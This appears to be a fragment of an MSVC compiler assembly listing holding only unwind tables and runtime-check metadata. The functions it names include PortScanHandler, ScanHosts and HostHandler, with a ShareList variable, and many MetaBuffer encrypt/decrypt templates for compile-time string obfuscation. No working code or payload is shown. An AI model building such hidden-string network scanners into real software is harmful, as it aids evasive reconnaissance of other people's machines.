xdata	SEGMENT
$unwind$?PortScanHandler@@YAKPEAX@Z DD 045053d19H
	DD	010e4313H
	DD	070070049H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0238H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?PortScanHandler@@YAKPEAX@Z$rtcName$0 DB 068H		; PortScanHandler
	DB	054H
	DB	069H
	DB	06dH
	DB	065H
	DB	072H
	DB	00H
	ORG $+1
?PortScanHandler@@YAKPEAX@Z$rtcName$1 DB 064H		; PortScanHandler
	DB	077H
	DB	042H
	DB	079H
	DB	074H
	DB	065H
	DB	073H
	DB	054H
	DB	072H
	DB	061H
	DB	06eH
	DB	073H
	DB	066H
	DB	065H
	DB	072H
	DB	072H
	DB	065H
	DB	064H
	DB	00H
	ORG $+5
?PortScanHandler@@YAKPEAX@Z$rtcName$2 DB 043H		; PortScanHandler
	DB	06fH
	DB	06dH
	DB	070H
	DB	06cH
	DB	065H
	DB	074H
	DB	069H
	DB	06fH
	DB	06eH
	DB	053H
	DB	074H
	DB	061H
	DB	074H
	DB	075H
	DB	073H
	DB	00H
	ORG $+7
?PortScanHandler@@YAKPEAX@Z$rtcName$3 DB 043H		; PortScanHandler
	DB	06fH
	DB	06eH
	DB	06eH
	DB	065H
	DB	063H
	DB	074H
	DB	043H
	DB	06fH
	DB	06eH
	DB	074H
	DB	065H
	DB	078H
	DB	074H
	DB	00H
	ORG $+9
?PortScanHandler@@YAKPEAX@Z$rtcVarDesc DD 0e8H		; PortScanHandler
	DD	08H
	DQ	FLAT:?PortScanHandler@@YAKPEAX@Z$rtcName$3
	DD	0c8H
	DD	08H
	DQ	FLAT:?PortScanHandler@@YAKPEAX@Z$rtcName$2
	DD	0a4H
	DD	04H
	DQ	FLAT:?PortScanHandler@@YAKPEAX@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:?PortScanHandler@@YAKPEAX@Z$rtcName$0
	ORG $+192
?PortScanHandler@@YAKPEAX@Z$rtcFrameData DD 04H		; PortScanHandler
	DD	00H
	DQ	FLAT:?PortScanHandler@@YAKPEAX@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?TimerCallback@@YAXPEAXE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0d5H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CompleteAsyncConnect@@YAH_K@Z DD 035053d19H
	DD	010e3313H
	DD	07007002bH
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0148H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?CompleteAsyncConnect@@YAH_K@Z$rtcName$0 DB 053H	; CompleteAsyncConnect
	DB	065H
	DB	063H
	DB	06fH
	DB	06eH
	DB	064H
	DB	073H
	DB	00H
?CompleteAsyncConnect@@YAH_K@Z$rtcName$1 DB 042H	; CompleteAsyncConnect
	DB	079H
	DB	074H
	DB	065H
	DB	073H
	DB	00H
	ORG $+2
?CompleteAsyncConnect@@YAH_K@Z$rtcVarDesc DD 074H	; CompleteAsyncConnect
	DD	04H
	DQ	FLAT:?CompleteAsyncConnect@@YAH_K@Z$rtcName$1
	DD	054H
	DD	04H
	DQ	FLAT:?CompleteAsyncConnect@@YAH_K@Z$rtcName$0
	ORG $+96
?CompleteAsyncConnect@@YAH_K@Z$rtcFrameData DD 02H	; CompleteAsyncConnect
	DD	00H
	DQ	FLAT:?CompleteAsyncConnect@@YAH_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02aH
	DW	011fH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ScanHosts@@YAXXZ DD 045053119H
	DD	010a430fH
	DD	07003002fH
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0168H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?ScanHosts@@YAXXZ$rtcName$0 DB 064H			; ScanHosts
	DB	077H
	DB	042H
	DB	079H
	DB	074H
	DB	065H
	DB	073H
	DB	053H
	DB	065H
	DB	06eH
	DB	074H
	DB	00H
	ORG $+4
?ScanHosts@@YAXXZ$rtcName$1 DB 053H			; ScanHosts
	DB	06fH
	DB	063H
	DB	06bH
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	00H
	ORG $+7
?ScanHosts@@YAXXZ$rtcVarDesc DD 088H			; ScanHosts
	DD	010H
	DQ	FLAT:?ScanHosts@@YAXXZ$rtcName$1
	DD	064H
	DD	04H
	DQ	FLAT:?ScanHosts@@YAXXZ$rtcName$0
	ORG $+96
?ScanHosts@@YAXXZ$rtcFrameData DD 02H			; ScanHosts
	DD	00H
	DQ	FLAT:?ScanHosts@@YAXXZ$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02aH
	DW	02b1H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CreateHostTable@@YAHXZ DD 035053119H
	DD	010a330fH
	DD	070030039H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	01b8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?CreateHostTable@@YAHXZ$rtcName$0 DB 062H		; CreateHostTable
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	00H
?CreateHostTable@@YAHXZ$rtcName$1 DB 064H		; CreateHostTable
	DB	077H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+6
?CreateHostTable@@YAHXZ$rtcName$2 DB 053H		; CreateHostTable
	DB	06fH
	DB	063H
	DB	06bH
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	00H
	ORG $+15
?CreateHostTable@@YAHXZ$rtcVarDesc DD 0d8H		; CreateHostTable
	DD	010H
	DQ	FLAT:?CreateHostTable@@YAHXZ$rtcName$2
	DD	074H
	DD	04H
	DQ	FLAT:?CreateHostTable@@YAHXZ$rtcName$1
	DD	054H
	DD	04H
	DQ	FLAT:?CreateHostTable@@YAHXZ$rtcName$0
	ORG $+144
?CreateHostTable@@YAHXZ$rtcFrameData DD 03H		; CreateHostTable
	DD	00H
	DQ	FLAT:?CreateHostTable@@YAHXZ$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	034H
	DW	01a9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?AddHost@@YAHK@Z DD 035053b19H
	DD	010d3312H
	DD	070060035H
	DD	05005H
	DD	imagerel __GSHandlerCheck
	DD	0198H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?AddHost@@YAHK@Z$rtcName$0 DB 074H			; AddHost
	DB	065H
	DB	06dH
	DB	070H
	DB	00H
	ORG $+11
?AddHost@@YAHK@Z$rtcVarDesc DD 0b8H			; AddHost
	DD	010H
	DQ	FLAT:?AddHost@@YAHK@Z$rtcName$0
	ORG $+48
?AddHost@@YAHK@Z$rtcFrameData DD 01H			; AddHost
	DD	00H
	DQ	FLAT:?AddHost@@YAHK@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09b9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	022fH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?HostHandler@@YAKPEAX@Z DD 025053d19H
	DD	010e2313H
	DD	070070045H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0210H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?HostHandler@@YAKPEAX@Z$rtcName$0 DB 053H		; HostHandler
	DB	068H
	DB	061H
	DB	072H
	DB	065H
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+6
?HostHandler@@YAKPEAX@Z$rtcVarDesc DD 028H		; HostHandler
	DD	010H
	DQ	FLAT:?HostHandler@@YAKPEAX@Z$rtcName$0
	ORG $+48
?HostHandler@@YAKPEAX@Z$rtcFrameData DD 01H		; HostHandler
	DD	00H
	DQ	FLAT:?HostHandler@@YAKPEAX@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0575H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02bH
	DB	055H
	DB	07fH
	DB	0a9H
	DB	0d3H
	DB	0ddH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	0281H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0107H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02bH
	DB	055H
	DB	07fH
	DB	0a9H
	DB	0d3H
	DB	0ddH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01afH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0107H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
